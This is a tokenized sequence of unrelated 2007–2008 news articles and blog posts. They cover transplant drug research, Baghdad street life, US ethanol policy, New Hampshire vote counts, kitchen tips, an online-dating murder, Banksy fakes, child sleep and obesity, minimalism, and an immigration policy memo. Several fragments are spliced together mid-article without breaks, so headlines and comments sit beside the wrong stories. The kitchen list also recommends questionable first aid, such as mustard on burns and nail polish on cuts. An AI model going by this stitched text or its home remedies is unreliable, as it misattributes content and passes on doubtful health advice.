Unless the organ comes from an identical twin , the body 's reaction is to reject it as a foreign invader .
UK experts said the findings were exciting , but warned a lack of donor organs remained the principal problem .
The idea of getting off drugs holds tremendous appeal for patients
John Scandling
Stanford School of Medicine
Close matches require a lifetime of immunosuppressive drugs which increase the risk of infection , high blood pressure and cholesterol .
They can also increase the risks of certain types of cancer .
Doctors have been working for years on ways to stop this process of rejection and reduce the need for drugs .
While most transplant units in the UK have managed to cut the dosage by about 50 % in the last five years , the risk of side - effects remains .
The results of both studies appear in the New England Journal of Medicine .
In the first study at Stanford University , a man who received his brother 's kidney has gone for two years without drugs after his doctors tweaked his immune system with irradiation and antibody treatments .
He then received an infusion of his brother 's blood cells .
This combined treatment created a kind of " peacekeeping " immune cell , which appeared able to avert the attack on the foreign organ .
" The idea of getting off drugs holds tremendous appeal for patients , " said the study 's lead author , Professor John Scandling .
" So far , there is hope , but we still have a long way to go . "
Destroying bone marrow
The second study was conducted at Massachusetts General Hospital .
As in all parts of the world , the main problem in transplantation is the shortage of organs
Robert Higgins
Renal specialist
Five patients were given treatment that partially destroyed their bone marrow and with it the white blood cells which cause rejection .
This bone marrow was then replaced with a bone marrow graft from the donor , and the kidney followed .
One of the five rejected the kidney , but the other four have so far been able to live with normal kidney function and without drugs - the longest for over five years .
Dr Robert Higgins , a specialist in renal transplantation , said while both studies were exciting , he had particular concerns about the one carried out in Massachusetts .
" While these early results are encouraging , the treatment involved in destroying the bone marrow can be life threatening , and there are other risks , such as the bone marrow graft trying to ' reject ' the patient . "
He added : " As in all parts of the world , the main problem in transplantation is the shortage of organs . "
In the UK , the prime minister has thrown his weight behind plans to put everyone automatically on the organ donor list , as is done in countries such as Spain , rather than relying on people to sign up .

Caught on cctv camera outside a city hall a woman right in front of police officers sets herself alight
We set off and offered to help join the search for the insurgent .
As we hurtled along in the growling vehicle , I could watch our progress on screen .
The dusty street passed beneath us at speed , then we paused at a wide cesspool , a common sight in Baghdad .
The Stryker 's camera , ever watchful for roadside bombs , zoomed in on a stick - like object rising above the water 's surface , then jerked to a man who seemed to be foraging nearby .
On closer inspection the man was ageing , dishevelled and lame , walking by the kerb with a shambling gait .
The Stryker reversed to seek another route .
Then another image appeared on the monitor .
Before another cesspool was a pile of rubbish strewn in the middle of the street - again , nothing unusual .
A woman in a long , black robe approached it , turned a household bin upside down and poured its contents on to the pile .
Then she took a second bin and repeated the action .
The US soldier sitting at the monitor shook his head in despair .
So did I .
Somehow there was something more shocking to me , in Baghdad at least , about this act of throwing litter than the throwing of a grenade .
The middle - aged woman had performed it without a hint of the social embarrassment that might nag a litterlout in Britain .
More than that , there was something habitual about her action that suggested her mind was otherwise occupied , as if pouring household garbage into the middle of the road was now casual routine , now second nature .
And so al - Hadar , formerly one of the Baghdad 's most prosperous areas , has become - quite literally - a waste land .
The spacious houses with gardens , walls and front drives are still there , but the streets are strewn with sewage , rubbish and rubble .
Stepping outside , it is often the smell that hits you first .
You might also suddenly be taken aback , in this modern city , by the sight of a flock of goats or sheep , or a woman riding a donkey trap .
Among the most poignant discoveries are the empty buildings .
I looked around an old gym which until recently had been used by insurgent gunmen as a vantage point .
All the equipment had gone , but there were still posters of western musclemen on the walls , now watching over debris and stillness .
I visited a school that is trying to reopen , the rows of empty desks and chairs speaking volumes , the chalk writing of a teacher still on a blackboard but no one to read it .
Earlier this week I attended a memorial service for 2nd Lieutenant Peter Burks , a member of the regiment killed last week when a roadside bomb hit his Stryker vehicle .
He was 26 and left behind a fiancee .
It would be a mistake to think that , because soldiers face death every day , they feel grief and loss any less acutely than other people .
In a large white room , rows of uniformed soldiers waited for the service to begin with sorrow etched on their young faces , the silence punctuated only by sniffs of choked emotion .
At the front of the room was the symbolic helmet balanced on the end of an upright rifle , and a framed picture of Lt Burks under the words " In memoriam " .
Everyone stood as the Star Spangled Banner was played through loudspeakers .
Lt Burks 's squadron commander , Lieutenant - Colonel Antonio Aguto , had to pause , his voice breaking as he paid tribute .
" We can take comfort from the fact he did not die in vain , " he said .
" He died a soldier 's death on the streets he swore to protect . "
Chaplain Bryan Smith said Lt Burks had been a strong Christian .
" Even though I feel his absence , I know where he is : heaven ... it took God six days to create the earth ; he has been working on heaven for 2,000 years . "
There was a moment of silence , when all heads bowed , then a sergeant , Kevin Muhlenbeck , shouted the name of a regiment member as if on the parade ground .
" Sir ! " came back the reply .
He shouted another name .
" Sir ! " came the reply .
" Burks ! "
No reply .
" Peter Haskell Burks ! "
No reply .
Avoice outside gave an order to fire , and three times gunfire cracked in the night air .
More than 3,850 US troops have died during the Iraq war .
From afar that can look like a statistic .
Up close , it looks like a room full of sadness and a search for consolation .
With gasoline near $ 3 a gallon , climate concerns rising , and an election season in full swing , politicians are eager to tell constituents that they 're doing something to help at the gas pump .
Enter ethanol – or , more specifically , a plan in Congress to mandate that US gasoline refiners add a minimum of 36 billion gallons of ethanol to the nation 's gasoline supply – up from the 7.5 billion gallons currently mandated by 2012 .
Ethanol 's popularity comes despite charges from environmentalists , livestock farmers , and opponents of subsidies that the move wo n't meet energy goals and may damage the environment as food prices soar .
Energy - security experts say the measure also falls short on a key goal : weaning America off foreign oil .
Boosting ethanol production is the political equivalent of motherhood and apple pie these days .
Politicians on both sides of the aisle as well as presidential candidates eager to do well in Iowa , the nation 's No. 1 ethanol - producing state , are behind the measure , unglamorously named the " Renewable Fuels Standard . "
The RFS , part of the energy bill in the Senate , is so popular that it may be enough to ram through energy legislation this year , despite bitter disagreements over other parts of the bills .
" Quite a few folks around here think the biofuels title alone can carry the entire energy bill , " says Bill Wicker , a Democratic staff aide for the Senate Committee on Energy and Natural Resources .
" Biofuels are not a red - state , blue - state issue . "
The energy bill faces the threat of a presidential veto , but if RFS does become law , it would provide a huge boost to the ethanol industry .
The measure would create a demand for about 36 billion gallons of ethanol by 2022 , or about 15 percent of US gasoline consumption , nearly a fivefold increase from the target under the current law .
It could also save the industry from an acute glut .
Evidence of an ethanol glut had been growing this year with ethanol prices falling dramatically until they rebounded a bit last month .
Several recently announced ethanol plants are on hold , experts say .
" This new RFS is simply vital for the industry , " says Tom Koehler , vice president for public policy of Pacific Ethanol , Inc. , a manufacturer in Sacramento , Calif .
Among its advantages : Ethanol fuel can create fewer greenhouse - gas emissions than gasoline and it's made from corn , a US - made renewable resource , instead of nonrenewable oil , which increasingly comes from abroad .
Nevertheless , many critics say that boosting corn - based ethanol alone is wrongheaded .
For example , energy security is a key driver of the RFS .
But the ethanol measure falls short , says Anne Korin , chairman of the Set America Free Coalition , a Washington - based energy security advocacy group .
" You 're not going to get real change by specifying a fuel level in the market , as this energy bill does , " she says .
" We have to make sure cars in this country can burn a variety of fuels so oil has some competition . "
Boosting corn-ethanol production " could change current irrigation practices and greatly increase pressure on water resources , " the National Research Council concluded in a study released last month .
In a letter to Speaker of the House Nancy Pelosi last month , 28 environmental groups decried the RFS saying it would " lead to substantial environmental damage and a system of biofuels production that will not benefit family farmers ... will not promote sustainable agriculture and will not mitigate global climate change . "
Much of the criticism targets today 's corn - based variety .
But if companies can figure out inexpensive ways to turn other biomass into ethanol , then the new fuel could create an environmentally friendlier alternative to fossil fuels .
The new RFS would cap corn - based ethanol incentives at 15 billion gallons by 2015 – the remaining 21 billion gallons would be " advanced biofuels , " primarily ethanol made from switch grass and other materials .
" It all depends on how you make it , " says Nathanael Greene , a biofuels analyst at the Natural Resources Defense Council in New York .
" We need tough performance standards in this bill – and I think we have a good chance of getting them . "
Right now , he says , the primary RFS requirement is a 20 percent reduction in greenhouse emissions – not enough to curb climate change very much .
But congressional leaders are said to be considering a required 50 percent cut in greenhouse emissions .
Such a reduction would not come cheaply .
Already , the federal government pays 51 cents to oil companies for every gallon of ethanol they blend into gasoline at a cost of about $ 6 billion annually , according to a new study by Earth Track , a Boston - based energy - consulting firm .
That cost will rise to $ 14 billion by 2014 under current law , the study says .
With the new RFS , those costs would leap " tens of billions per year above these levels . "
Industry experts dispute those amounts but say such a subsidy is necessary to unhook the US from imported oil .
" If you compare the ethanol subsidy with current transportation and oil system subsidies it pales by comparison , " says Mr. Koehler .
To get the energy bill passed , congressional leaders are trying to craft a bill attractive enough to farm - state Republicans to avoid a filibuster and perhaps override a presidential veto – while not losing support from those worried that ethanol is too costly given its limited environmental and energy security gains .
Despite its detractors , the political momentum of the biofuels provision may hold sway , some observers say .
The latest sign that growth in consumer spending , the mainstay of the U.S. economy , is slowing ?
A nip and tuck in spending on cosmetic surgery .
The slowdown was a hot topic at the meeting of the American Society of Plastic Surgeons in Baltimore this fall .

New Hampshire Primary : postmortem
My premise is that given a set of medium - sized towns which includes a statistically significant amount of both hand and machine counting , the ratio of votes received by each candidate from AccuVote machines should match the overall ratio for the towns .
For example , for towns with 500 - 800 votes , 41 % of total votes were by AccuVote , so I would expect the individual candidates to show 41 % of their votes from AccuVote .
However Obama 's AccuVote numbers come in significantly lower , and are consistently lowest among the candidates for various vote ranges I 've tried .
Conversely , Clinton 's machine vote numbers are significantly higher than the overall ratio , and consistently highest among the candidates .
Data sources :
Run comparison for towns having between and votes
Swap Clinton / Obama AccuVotes

13 Simple , Timeless Kitchen Hacks ( Banish Tears , Cuts , Burns , Smells & Stains ! )
1. Finally , a use for old potatoes : if you have added too much salt to a recipe , toss in a peeled potato while your dish is still cooking to prevent your tongue from shriveling up like a slug upon first bite .
( Just do n’t use taters that have any green tint creeping into the flesh .
That ’s a sure sign of the toxin solanine .
Generally , solanine will not hurt you in small quantities , but just to be safe , avoid the kryptonite - hued spuds . )
2 . Did you burn your finger ?
Immediately rub the singed spot with spicy mustard to draw out the pain .
Bonus : this is a lickable solution .
3. Leftover wine ?
Pour the remains of the bottle into an ice cube tray , freeze , and store for future use in your drunk marinara .
( Leftover wine = good problem . )
4 . To remove the smell of garlic and onions from your fingers , simply run your digits along a stainless steel blade .
Carefully !
This wo n’t work for your mouth .
5 . To keep sliced apples and avocados from browning , drizzle with lemon or lime juice .
6 . Did you catch one of those invisible hair - like splinters that rivals a paper cut for the Most Annoying Pain Possible award ?
Simply press a strip of tape gently to your skin .
This works far better than scraping away at your skin with fingernails or tweezers .
7 . Do n’t hatch your batch .
To prevent cracked shells when making boiled eggs , simply add a pinch of salt to the water .
8 . Keep tomatoes and citrus fruits like lemons far from the refrigerator for the nicest fragrance , juiciest results , and truest flavor ( we ’re horrifying grammar teachers everywhere , as we speak .
Write .
Read .
Surf. Arrrgh !!! ) .
Oh : nestled in a bowl in the sun is best .
9 . To clean those ever - impossible crevices in vases and pitchers , just drop in two Alka - Seltzer tablets , fill the item with water , and wait .
10 .
To prevent your eyeballs from putting on a miniature waterworks show when you are cutting up onions or shallots , simply press your tongue to the roof of your open mouth ( and do not breathe through your nose ) .
11 . Rather than taking harsh detergents to your pots and pans , scrub them clean with a dry paper towel and coarse salt .
This is invaluable for cast - iron cookware .
12 . To remove those fossilized food splatters in the microwave , place a water - soaked sponge inside and “ cook ” on high for two minutes .
Leave the microwave door closed for another five minutes ( you do n’t want to scald yourself ) .
The steam will loosen up the food and you can easily wipe it all off without the use of chemical cleaners .
13 .
Fix a finger nick with clear nail polish ( wait for the bleeding to stop , silly ) .

A year after Raymond Merrill of San Bruno was slain after being lured to Brazil by a woman he met on the Internet , friends and family will celebrate the former carpenter and rock musician ’s life at a memorial service on Saturday .
Merrill ’s death at 56 made headlines last fall after Brazilian authorities and the FBI connected his disappearance with a burned corpse they had discovered .
A woman Merrill had met online and traveled to Brazil to visit faces trial for her role in an alleged plot that involved drugging , robbing and finally killing him .
A man who said he was paid to dispose of the body is also in custody , while two other alleged accomplices remain at large .
Merrill ’s sister , Marcia Sanchez Loebick of Cleveland , said the memorial service will bring some closure , but it ’s not enough .
“ I wo n’t rest until ( the perpetrators ) are all brought to justice . ”
The case stands as a stark reminder of the danger of Internet predators , but Loebick said the memorial will focus on the bright side of his life .
“ He was a really sensitive person , ” Sanchez Loebick said .
“ He was talented , bright , and he marched to the beat of his own drummer .
He had a lot of integrity . ”
Some of his most endearing traits – idealism , credulity , a desire to love and be loved – were used against him by his killers , Sanchez Loebick said .
“ Because he had a good heart , he assumed that other people did too .
He had a tendency to trust people who behaved in a very cordial fashion , and he trusted too quickly . ”
Friends say Merrill became somewhat reclusive in his last years , spending much of his time fixing up his house on Jenevein Avenue .
He dreamed of selling it and spending his retirement in South America , where he had once lived for several years with his wife before getting divorced .
His ex-wife , with whom Merrill kept in close contact , has organized a memorial mass in his honor in Buenos Aires to coincide with the service in San Bruno , Sanchez Loebick said .
With the publicity surrounding Merrill ’s death have come e-mails and calls to Sanchez Loebick from old friends and Crestmoor High School classmates of Merrill .
Many are expected to attend Saturday ’s service .
The periodic reminders of Merrill ’s death in the media are painful , Sanchez Loebick said , but she hopes they also ensure that prosecution in the Brazilian legal system happens and serve as a warning to others of the perils of Internet dating .
She ’d like to see more safeguards built into online dating services , such as background checks .
But for now she urges people to exercise caution before visiting someone they meet on the Web .
IF YOU GO :
The memorial service for Raymond Merrill will be held Saturday , March 24 at 1:30 p.m. at St. Andrew ’s Episcopal Church , 1600 Santa Lucia Ave. , San Bruno .
Also , Marcia Sanchez Loebick , sister of slain San Bruno resident Raymond Merrill , is creating a petition to urge Brazilian authorities to treat the case seriously .
She asks supporters to e-mail her at justice4raymondyahoo.com .

Jan. 16 , 2008  -- Florida law enforcement officials have been denied access to the office computers of disgraced former Congressman Mark Foley , despite a direct appeal to Speaker of the House Nancy Pelosi for help in their investigation of sexually explicit messages sent to current and former teenage congressional pages .
In response to a letter sent to Pelosi last month by the Florida Department of Law Enforcement , House Deputy General Counsel Kerry Kircher denied the agency 's request , citing the Speech or Debate Clause of the Constitution , which protects congressional papers .
" We have received [ the House 's ] response , and our investigative team is reviewing it , " FDLE spokesperson Heather Smith told ABC News .
She said despite the House refusal to provide access to Foley 's computers , the FDLE is still investigating the former Republican who now sells real estate in Palm Beach , Fla .
Foley resigned Sept. 29 , 2006 , hours after ABC News questioned him about sexually explicit messages with former congressional pages , some of whom were under the age of 18 at the time of the exchanges .
Federal officials turned the case over to Florida after concluding that Foley did not engage in any actual sexual contact until the former pages had turned 18 , and had therefore not violated federal law .
Washington , D.C. law defines the age of consent as 16 .
Under Florida law , it is a third - degree felony both to use the Internet " to seduce , solicit , lure or entice " a minor " to commit any illegal act ... relating to lewdness and indecent exposure " and to transmit any " information or data that is harmful to minors ... via electronic mail , " which includes instant messages .
In the letter to the FDLE , Kircher also wrote that the House counsel understood " from other sources " that the FDLE had closed its investigation and directed Commissioner Bailey -- " without trying to tell you how to conduct your investigation " -- to consult with the Department of Justice and Foley 's lawyers .
Over the summer , Kircher had said , " At DOJ 's request , the CAO ( the Chief Administrative Officer of the House ) has already searched the two sets of back up tapes for sexually explicit graphic attachments and embedded images .
Nothing responsive was found . "
" The speaker referred the commissioner 's request to the House Office of General Counsel , and that response is the response of the House , " Brendan Daly , spokesman for the Pelosi , told ABC News .
As for Foley himself , his Washington , D.C. lawyer , Bill Taylor , told ABC News the former congressman has " no comment , " but added , " He has not committed any crime .
We expect all investigations to be terminated very shortly . "

Birmingham city schools will be the first in the nation to receive laptop computers designed for children in third - world countries under an agreement completed over the weekend , Mayor Larry Langford announced Monday .
Langford signed a purchase agreement for 15,000 laptops from One Laptop Per Child , a nonprofit foundation whose goal is to provide every child in the world with access to technology .
" We live in a digital age , so it is important that all our children have equal access to technology and are able to integrate it into all aspects of their lives , " Langford said .
" We are proud that Birmingham is on its way to eliminating the so - called `digital divide ' and to ensuring that our children have state - of - the - art tools for education . "
Under the agreement , the city will buy 15,000 laptops for $ 200 each , Langford said .
The $ 3 million deal will allow every child in grades one through eight in Birmingham city schools to receive a laptop , he said .
" Our students will have access to global thinking now , " said Birmingham schools Superintendent Stan Mims .
" It becomes a tipping point in the digital divide . "
Langford has asked the City Council to approve $ 7 million for the laptops and a scholarship program that would give Birmingham students with a C average or above a scholarship to college or tech school of their choice .
The City Council has not yet approved the funding .
The rugged , waterproof computers will be distributed to students on April 15 , Langford said , and children will be allowed to take them home .
If a computer is lost , the school system can disable it , rendering it useless , Langford said .
Students will turn in their computers at the end of their eighth - grade year .
Kids know how :
The machine , called the XO Laptop and dubbed the " $ 100 laptop , " was designed by Nicholas Negroponte , the founding director of the Massachusetts Institute of Technology 's Media Laboratory .
He set out to build a $ 100 laptop so every child in developing countries could have access to new channels of learning , said Jackie Lustig , spokeswoman for One Laptop Per Child .
The XO did n't make the target price and it sells for about $ 200 , still far below the $ 500 price tag of most basic laptop computers in U.S. retail shops , Lustig said .
Langford said training for the computers will not be a problem , as they were designed for children to pick up on immediately .
" Get the computers , get them in the children 's hands and get out of the way , " he said .
He brought back two demo computers from his weekend trip to Boston and said a 3 - year - old went up to him at a restaurant and began teaching him to use the computer .
" Every child in this restaurant came up to me and within minutes , they were on Google surfing the Web , " he said .
Even though the computers are so easy to use , Langford said a consulting firm has offered to train students in all Birmingham schools .
Langford said he was asked to be the national spokesman for the program as other U.S. cities begin taking advantage of One Laptop Per Child .
Buy one , give one :
Last month only , the foundation opened sales to residents in the United States and Canada , who could buy the laptops for $ 399 .
Each purchase funded a second laptop that went to a needy child in a developing country .
The machines do n't run Microsoft Office , Photoshop or any other standard Mac or Windows programs , instead using a free , open - source version of GNU / Linux , with a simplified graphical interface designed for children that is called Sugar , Lustig said .
The laptop has a 500 - megahertz processor and 256 megabytes of DRAM ( dynamic random access memory ) with 1 gigabyte of flash memory .
The laptops have Web browsers and their own Wi -Fi system , the ability to connect to the Internet wirelessly .
Some Birmingham schools already have wireless capabilities , said Claudia Williams , chief academic officer , and the system is about to begin a " major technology upgrade " with a portion of the $ 300 million it received from Jefferson County 's one - cent - on - the - dollar sales tax increase .
" The upgrade will be no less than top - notch , and if these computers run on wireless , then that 's what we 'll have in our schools , " she said .
The computer can be used to compose music and has programs designed to teach students all types of math , science , reading and social studies , Langford said .
Each is on a " mesh network , " meaning all the laptops can see each other , without any setup , even if there is no wireless connection nearby .
The mesh networking allows classmates and teachers to see what each class member is working on .
Langford said the computers are more than sufficient for Birmingham students ' needs .
" We 're not trying to give these kids a computer that would launch a space shuttle . "

Not everyone has a couple of hundred thousands pounds to spend on graffiti art , plus a few thousand more to remove the wall that it 's scribbled on .
Yours for £ 208,100
With hundreds of street artists adopting the stencilled style of the most famous and secretive spray - can expert around , there are more and more imitations appearing .
Many of Banksy 's murals only last a few days before death by scrubbing brush , except in his native city .
Bristol Council has made a pledge to preserve the work of its famous son , but it removes daubings thought to be fake .
So how do you know if the mural at the end of your street is a genuine Banksy ?
SEND YOUR BANKSY PICS Email : yourpics@bbc.co.uk , subject BANKSY
Tell us in 50 - 100 words what the mural means to you MMS from UK : 61124 Int MMS : +44 7725 100100
Terms and conditions
But that 's no good to someone who stumbles across a Banksy - like scene under a railway bridge or on the side of a house and wants to know if it 's real .
Trademark style
Bill " Kilo " Pengelly , a legal graffiti artist who works on street - art projects with teenagers , is something of an expert .
In the past year there has been an explosion in Banksy imitations , he says , some of which seek to fool the viewer by including the Banksy logo and recurring motifs such as a monkey .
BANKSY FACT AND FICTION
Became a freehand graffiti artist aged 14 in Bristol Parents still think he's a decorator Designed cover of Blur album Think Tank In 2005 put subverted works in famous galleries in US and UK Painted nine images on West Bank barrier in same year Exhibition in Los Angeles had real " elephant in the room " Reported buyers include Christina Aguilera and Brad Pitt
" He would do something in the middle of Oxford Street , but others get the areas where the walls either have permission or no - one bothers about them , in the middle of the worst housing estate or an abandoned warehouse . "
Banksy's work is bigger , bolder and more elaborate than others , says Kilo , but technically not very advanced .
" If you look in a graffiti stencil book you will see work like this or better , but the difference with Banksy is where he 's doing it and the topics . "
Areas like Old Street and Vauxhall are full of Banksy imitations , but the works lack detail , partly because Banksy uses multi-layered stencils while others use just one .
Bristol Council deemed this a fake
" Ask the owner of the property and ask if it's by him because he always asks permission .
They are usually by him , it seems to me .
If you have an eye for style then you 'll see if it 's one of his .
There usually is n't very much colour , it 's monochrome with spots of colour .
" The drawing will be reasonably competent , not brilliant , he 's not a great artist .
And it will be making a small jokey point about something .
It 's very difficult to fake that authentically .
I do n't doubt people will try but he 'll distance himself from it . "
Banksy 's prints sell for thousands of pounds but he signs the authentic ones .
And in the only interview he appears to have given , he said he did not care if people ripped off his work .
School of ...
The art world has long discovered that works officially classed as " authentic " may not be at all .
The committee that verifies Andy Warhol 's work has been accused of getting it wrong , rejecting works that are clearly real - although Warhol delegated some of the production , making it a complex question .
Andy Warhol churned out art , imitating the mechanical processes of industry , so the difference between the real and a reproduction and a copy is difficult to determine
Richard Dorment
" Until you know who made the work of art , it 's very difficult to say anything else about it .
If it 's a copy , it has no meaning within that artist 's group of works . "
Auction houses have teams of experts analysing the artworks for sale , but even they make mistakes .
Last year Christie 's was forced to withdraw a ceramic sculpture the day before auction because Grayson Perry told them that he had not made it .
The techniques of artists such as Warhol and Banksy are more easily imitated than a painter like Renoir , says Mr Dorment , and mass production makes validation an increasingly difficult issue .
" Andy Warhol churned out art , imitating the mechanical processes of industry , so the difference between the real and a reproduction and a copy is difficult to determine . "
STENCILLING
Banksy uses stencils which saves time and gives his work sharp edges that are hard to replicate freehand .
Stencilling used to be rare in the UK , more a technique seen on the streets of France , but Banksy 's success means it 's become very common .
Acetate is a common choice of material but a cereal box will do the job too .
DETAIL
Banksy has a greater degree of detail than most artists because his stencils are multi-layered .
Critics say he is a competent rather than brilliant technician .
SIGNATURE
His signature does not appear on all his works but on many of his pieces in the UK .
In this piece , it 's larger than normal .
A fake Banksy in Bristol had his signature but some fans indicated it was n't real because the paint ran .
MONOCHROME
Most of Banksy 's pieces are monochrome , with a splash of colour .
This one is no different .
POLICE
The police officer is a Banksy motif - kissing another officer , questioning a child or generally being overzealous .
Here there are three in riot gear trying to apprehend a teddy armed with a firebomb .
TEDDY BEAR
Teddies appear in some of his work , notably as a witness to a child being frisked by a police officer .
Banksy never explains his work but the implication in this work , as in many others , is that a figure perceived as weak and innocent is fighting back against the heavy hand of authority .
It does what art is meant to do .
Makes you look and think .
Whatever your opinion , to have one means it has worked .
Many earlier styles were regarded unsympathetically and then became highly regarded .
I know many street artists , to them " Banksy " is a role model .
Great !
If they go on to create visual images that make people think then they are artists worthy of the name .
Good fortune to " Banksy . "
May he go on for many more street scenes .
Richard - East London
A Banksy Rat in Belsize Park NW3 was recently painted over by some builders renovating some flats - pretty sure they would have made more profit selling the wall than spending 6 months laying wooden floors and painting the walls cream !
Matt , London
In one of Banksy 's books , he discusses how the point of graffiti is that it 's for everyone .
These pieces that are originally drawn in public places , for all to see , free of charge .
Once sold to someone it 's not free anymore .
This is a statement in itself .
It shows how foolish Capitalism is at times ; the desire to buy that which is free to everyone already .
Jonathan Lee , Bristol
I disagree with the claim that this is mindless vandalism and should be removed .
It is not an attempt to devalue or destroy property , but to add an artistic or political statement in the public arena .
If van Gogh came back from the dead and daubed Sunflowers on a toilet wall , would we complain ?
The real success of Banksy is not his artistic merit or political statements , but as a marketing triumph .
For " anonymous " graffiti to sell at auction , spawn a bestselling book and make it onto the BBC discussion forum is a level of success many brand consultants can only dream of .
laughing all the way to the banksy , southampton
Art should be about if you like something or not and not about other people 's opinions .
I like some of Banksy 's work but I also like other artists who use their work to make clever social points .
He was not the first he is just probably the most well known / notorious and that is more to do with the Robin Hood identity he has created for himself .
Howard , Norwich
It 's all vandalism anyway .
So why the concern about " real " or " fake " .
Just remove it .
Gaz , Herts
How much longer are the people going to be duped into thinking this criminal 's overrated vandalism is art ?
KB , Bristol , England
The photograph accompanying your article showing a council worker taking a photograph of a stencil deemed to be a fake is actually around the corner from where I live .
It had been up for years before someone added the ' banksy ' logo .
Unlike most Banksy's where the logo tends to be in an unobtrusive spot this was placed at eye level next to the stencil .
Suddenly lots of people were stopping to take photographs ; at which point it attracted enough attention that it was removed shortly afterwards .
Charlotte Hennessey , Bristol
So the fact that it 's by Banksy is important , not how aesthetically " good " it is ?
What a triumph of marketing over substance ; so much for being champion of the underground art culture .

The study suggests he needs at least nine hours and 45 minutes
The latest research adds to a growing body of evidence that links a lack of adequate sleep to weight gain in both adults and children .
Of the children who slept 10 - 12 hours each night at age eight , around 12 % were obese by 11 , compared to 22 % of those who slept less than nine hours .
The Michigan University study appears in this month 's edition of Pediatrics .
Dr Julia Lumeng looked at 785 children from 10 US cities and analysed their sleep patterns , weight and height .
She said it was unclear why the results were so stark , but speculated it could be because tired children are less likely to go out and play .
Their study took into account the child 's original BMI , a calculation based on height and weight , and controlled their experiment accordingly .
But they did not look at parents ' weight and behaviour , which may also have an impact on the child .
Eating sweets
However the study does tally with several others , some of which have found that hormonal changes brought on by a lack of sleep can lead to an increased appetite .
Bristol University research found that people who habitually slept just five hours each night had 15 % more ghrelin , a hormone which increases feelings of hunger , than those who slept for eight hours .
A further study found those who slept little were more likely to eat calorie - rich sweet and starchy food during the day .
It has even been suggested that the link may hark back to prehistoric times , when humans stored up on fat during the summer months when food was plentiful and they slept less as a result of the shorter nights .
" We are just starting to work out the mechanisms : hormones play a role , but a lack of physical activity , which tires you out , could well be a factor too , " said Dr Sharhad Taheri , who has studied the relationship between sleep and obesity closely .
" Parents need to realise the importance of sleep .
Taking televisions and gadgets out of bedrooms could be a really good start . "
Right .
I ’m sure he is struggling with whether or not to stick around for another term in the minority or accept the $ 1,000,000 per year position .
Congressman Baker ( R - LA ) has followed the new procedures and filed paperwork with the House ethics committee as he talks to the increasingly power hedge fund lobby .

Tell me again what the ethics and lobbying reform bill was supposed to do last year ?
The best democracy that money can buy .
Why the Minimalist Lifestyle Appeals to Me
Minimalism appeals to me , because it makes me focus on what I truly love and need .
One of my favorite blogs is Zen Habits .
I started reading Zen Habits for the productivity tips , but lately I ’ve been fascinated with Leo ’s simple guide to a minimalist life .
If you were to come into my home , you ’d never guess that I even think about minimalism .
My home is n’t a disaster area , but it has plenty of clutter .
It ’s definitely well lived in .
So why does the minimalist lifestyle appeal to me ?
I see several benefits .
Minimalism Means Less Clutter
I have lots of clutter in my house , and I hate it .
I would love to actually have a place for everything , but in order to do that , I need to get rid of a lot of stuff .
I do n’t have a garage , and my outside storage shed is very small .
So everything I store would need to fit in one of my five closets .
I have to admit , I like the thought of only owning as much stuff as I can fit comfortably in my house .
Minimalism Means Less Waste
If I bring less stuff home , I do n’t have as much opportunity to waste .
I really try hard not to waste anyway , but sometimes that ’s hard in a cluttered home .
If the refrigerator or freezer gets cluttered , I forget what I have , and sometimes the yogurt hiding behind the milk goes bad .
The same goes for clothes .
If I own the minimal amount of clothing I need to get by , I ’m not likely to forget about an outfit hanging at the back of the closet .
I ca n’t count how many times that happened when my daughter was a baby .
She had so many baby clothes , that I ’d forget exactly what she had .
Then I ’d pull out an outfit , only to find that she had outgrown it already .
Minimalism Means Learning to be Content
I really believe that having an overabundance of stuff breeds discontentment .
It seems that the more things a person has , the more they need .
I know that ’s true in my life .
When I have the ability to buy more , I find that I start buying to fill some sort of unmet need in my life .
By cutting down the amount of stuff I allow myself to buy , I force myself to deal with my discontentment .
I need to learn to be content with what I have and find satisfaction in my relationship with God , my family life , and with who I am as a person .
Minimalism Means Really Loving What I Have
By forcing myself to cut down on the amount of stuff I own , I cut out the stuff that I ’m ambivalent about .
By embracing minimalism , I cut out everything but what I really love .
I remember reading Little House in the Big Woods as a child , and I remember reading about Laura and her doll , Charlotte .
Laura LOVED Charlotte .
I think she loved her so much because Charlotte was her only doll .
Charlotte was precious .
Charlotte was special .
How many things do I own that I consider to be truly special ?
My photographs are special .
Everything else ?
Not so much .
Though I doubt I have it in me to become truly minimalist , I am setting a goal for getting rid of stuff .
Cutting my things to what I really use and love lends itself to my quest to live a more frugal life .
So by the end of the year , I will go through every room in my house and get rid of what I do n’t use or love .
And to be really frugal , I ’ll sell what I can and put it toward my debt .

Memo to the Netroots on Immigration
Memo
TO : The Netroots
FROM : Elana Levin
The Drum Major Institute for Public Policy
DATE : December 4 , 2007
RE : Immigration and the blogosphere
The problem :
America ’s current immigration policy is clearly unacceptable to the general public , immigrant rights activists , immigration opponents and organized labor .
Even corporations are dissatisfied with the status quo , even if for their own profit - driven reasons .
There is a consensus that reform is needed but there is no consensus on what that reform should look like .
At the same time , the status quo of maximum noise with minimum action is a political strategy for a certain segment of the organized right wing .
The netroots can play a critical role on this issue by facilitating a conversation that will lead to increased political will for a progressive immigration policy that will benefit America ’s squeezed middle class and all those struggling to become middle class .
Many progressive and centrist politicians and political influencers have , until recently , chosen to either remain silent on the need for comprehensive immigration reform or confine their speech to statements supporting an increase in border control only .
Local elections across the nation have shown that anti-immigrant demagogy does not win elections despite the public ’s concerns about the issue .
Yet political leaders continue to advise progressives running for office to regard immigration policy as a “ third rail " that should not be touched .
The current state of the debate on immigration policy is entirely unproductive and the relative silence of progressive movement voices has , and will continue , to contribute greatly to the lack of vision and unity on this issue .
Treating immigration as a cause to support or attack for the sake of political expediency will not lead to an immigration policy that will strengthen and expand the middle class .
What is progressive immigration policy :
Responding to a vacuum in the immigration debate in 2005 , the Drum Major Institute for Public Policy issued our report : Principals for an Immigration Policy to Strengthen and Expand America ’s Middle Class .
In our report , we offer a framework for looking at immigration policy based on a shared economic interest in a progressive solution :
1 ) Immigrants make critical contributions to our economy as workers , entrepreneurs , taxpayers and consumers .
Progressive immigration policy should bolster , not undermine , those contributions .
2 ) When immigrants lack rights in the workplace , labor standards can be driven down for everyone .
Thus , progressive immigration policy must strengthen the workplace rights of immigrants and Americans .
Read the report ’s Executive Summary for arguments and citations supporting both parts of the litmus test .
DMI has also issued talking points to translate the framework into conversation .
We have long argued that this debate cannot be resolved legislatively .
It is a question of shaping hearts and minds .
To do this , we need effective messengers , messengers who are powerful voices but who also have a real analysis of the immigration issue .
For that reason , we urge the netroots to view our work and that of other experts in this field ( see resources ) .
The Netroots on immigration so far :
